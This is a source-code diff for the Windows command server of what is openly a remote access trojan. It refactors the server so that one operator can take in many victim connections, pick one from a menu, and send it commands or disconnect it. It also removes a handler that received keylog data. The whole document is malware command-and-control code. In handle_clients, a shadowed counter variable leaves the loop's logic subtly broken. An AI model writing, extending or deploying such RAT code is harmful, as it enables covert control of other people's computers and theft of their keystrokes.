@@ -1,10 +1,14 @@
+#include "clients_manager.h"
 #include "log.h"
 #include "net_util.h"
+
 #include <pthread.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <synchapi.h>
 #include <winsock2.h>
+#include <ws2tcpip.h>
 
 static void init_server_socket(SOCKET *server) {
   AddrInfo hints;
@@ -39,76 +43,6 @@ static void init_server_socket(SOCKET *server) {
     *server = INVALID_SOCKET;
     return;
   }
-}
-
-static SOCKET accept_client(SOCKET server) {
-  // accepting a connection
-  LOG_DEBUG("accetping...\n");
-  SOCKET client = accept(server, NULL, NULL);
-  if (client == INVALID_SOCKET) {
-    LOG_ERR("accept failed, error: %d", WSAGetLastError());
-    closesocket(server);
-    return INVALID_SOCKET;
-  }
-  LOG_DEBUG("accepted\n");
-  return client;
-}
-
-static void *client_input_handler(void *vargp) {
-  SOCKET client = (SOCKET)vargp;
-  char client_buf[DEFAULT_KEYLOG_BUFLEN];
-  ratpacket_t *p = (ratpacket_t *)client_buf;
-  int allocated = 0;
-  while (1) {
-    int recbytes = recv(client, (char *)p, sizeof(*p), 0);
-    if (recbytes == 0) {
-      LOG_DEBUG("connection closed");
-      return NULL;
-    }
-    if (recbytes < 0) {
-      LOG_ERR("recv failed with %d", WSAGetLastError());
-      return NULL;
-    }
-    switch (p->op) {
-    case RAT_PACKET_ECHO:
-      allocated = p->data_len > RAT_DATA_SIZE;
-      if (allocated) {
-        ratpacket_t *p_dynamic = malloc(sizeof(*p) + p->data_len);
-        if (!p_dynamic) {
-          LOG_ERR("malloc failed");
-          return NULL;
-        }
-        p_dynamic->op = p->op;
-        p_dynamic->data_len = p->data_len;
-        p = p_dynamic;
-      }
-      recbytes = recv(client, (char *)p->data, p->data_len, 0);
-      if (recbytes == 0) {
-        LOG_DEBUG("connection closed");
-        break;
-      }
-      if (recbytes < 0) {
-        LOG_ERR("recv failed with %d", WSAGetLastError());
-        break;
-      }
-      printf("%s", p->data);
-      break;
-    case RAT_PACKET_KEYLOG:
-      LOG_DEBUG("keylog");
-      recbytes = recv(client, (char *)p->data, p->data_len, 0);
-      break;
-    default:
-      LOG_DEBUG("unimplemented opcode %s (%d)", rat_opcode_to_str(p->op),
-                p->op);
-      break;
-    }
-    if (allocated) {
-      free(p);
-      p = (ratpacket_t *)client_buf;
-      allocated = 0;
-    }
-  }
-  return NULL;
 }
 
 static void read_alert(ratpacket_t *p) {
@@ -208,19 +142,43 @@ static int read_ratpacket(ratpacket_t **pp, int *allocated) {
   return 0;
 }
 
-static void *handle_client(void *vargp) {
-  SOCKET client = (SOCKET)vargp;
-  pthread_t client_recv_thread;
-  pthread_create(&client_recv_thread, NULL, client_input_handler, vargp);
+static void handle_clients(Server *server) {
   char server_buf[DEFAULT_BUFLEN];
-  memset(server_buf, 0, DEFAULT_BUFLEN);
   ratpacket_t *p = (ratpacket_t *)server_buf;
   int allocated = 0;
   LOG_DEBUG("started");
-  while (p->op != RAT_PACKET_DISCONNECT) {
+  pthread_t clients_handler_thread;
+  int conn_count;
+  pthread_create(&clients_handler_thread, NULL, accept_clients, (void *)server);
+  while (1) {
+    puts("Choose client:");
+    for (int i = 0, conn_count = 0; i < MAX_CLIENTS; i++) {
+      if (server->clients[i] != INVALID_SOCKET) {
+        printf("%d. %s\n", i, server->clients_addrs[i]);
+        ++conn_count;
+      }
+    }
+    if (!conn_count) {
+      Sleep(1000 * 60);
+      continue;
+    }
+    fgets(server_buf, sizeof(server_buf), stdin);
+    int index = atoi(server_buf);
+    if (index >= MAX_CLIENTS || server->clients[index] == INVALID_SOCKET) {
+      LOG_ERR("client %d doesn't exist", index);
+      continue;
+    }
+    SOCKET client = server->clients[index];
     if (read_ratpacket(&p, &allocated)) {
       LOG_ERR("read rat packet from user failed");
       continue;
+    }
+    if (p->op == RAT_PACKET_DISCONNECT) {
+      if (shutdown(client, SD_SEND) == SOCKET_ERROR) {
+        LOG_ERR("shutdown failed, error: %d", WSAGetLastError());
+      }
+      closesocket(client);
+      server->clients[index] = INVALID_SOCKET;
     }
     if (send(client, (char *)p, sizeof(*p), 0) == SOCKET_ERROR) {
       LOG_ERR("send failed with %d", WSAGetLastError());
@@ -237,10 +195,6 @@ static void *handle_client(void *vargp) {
     allocated = 0;
   }
   LOG_DEBUG("shutting down");
-  if (shutdown(client, SD_SEND) == SOCKET_ERROR) {
-    LOG_ERR("shutdown failed, error: %d", WSAGetLastError());
-  }
-  closesocket(client);
 }
 
 int main() {
@@ -249,23 +203,18 @@ int main() {
     LOG_ERR("init error: %d\n", WSAGetLastError());
     return 1;
   }
-  SOCKET server;
-  pthread_t client_handler_threads[MAX_CLIENTS];
-  init_server_socket(&server);
-  if (server == INVALID_SOCKET) {
+  Server server;
+  init_server_socket(&server.conn);
+  if (server.conn == INVALID_SOCKET) {
     LOG_ERR("init server socket failed");
     goto exit;
   }
-  SOCKET client;
   for (int i = 0; i < MAX_CLIENTS; i++) {
-    client = accept_client(server);
-    if (client == INVALID_SOCKET) {
-      goto exit;
-    }
-    pthread_create(client_handler_threads, NULL, handle_client, (void *)client);
+    server.clients[i] = INVALID_SOCKET;
   }
+  handle_clients(&server);
 exit:
-  closesocket(server);
+  closesocket(server.conn);
   WSACleanup();
   return 0;
 }
